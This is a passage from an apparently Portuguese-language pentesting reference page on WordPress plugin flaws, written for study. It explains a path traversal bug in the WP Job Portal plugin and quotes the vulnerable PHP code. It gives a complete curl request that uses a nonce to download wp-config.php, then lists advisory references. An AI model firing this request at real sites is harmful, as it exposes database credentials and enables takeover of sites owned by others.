Outra tarefa, **downloadcustomfile**, permitia que visitantes fizessem download de **qualquer arquivo no disco** via path traversal.  O sink vulnerável está localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` é controlado pelo atacante e concatenado **sem sanitização**.  Novamente, a única barreira é um **CSRF nonce** que pode ser obtido na página de currículo.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conteúdo de `wp-config.php`, leaking DB credentials and auth keys.

## Referências

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
